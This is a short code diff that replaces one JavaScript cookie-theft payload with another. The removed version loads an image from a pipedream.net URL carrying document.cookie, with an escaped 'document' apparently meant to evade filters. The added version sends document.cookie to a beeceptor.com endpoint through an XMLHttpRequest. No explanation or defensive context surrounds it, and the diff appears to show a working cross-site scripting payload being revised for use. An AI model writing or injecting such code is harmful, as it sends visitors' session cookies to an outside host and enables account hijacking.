@@ -1,2 +1,3 @@
-const img = new Image();
-img.src = 'https://eoposx8condin77.m.pipedream.net/?cookie=' + doc\u0075ment.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://coolendpoint.free.beeceptor.com/?cookie=" + document.cookie, true);
+xhr.send();
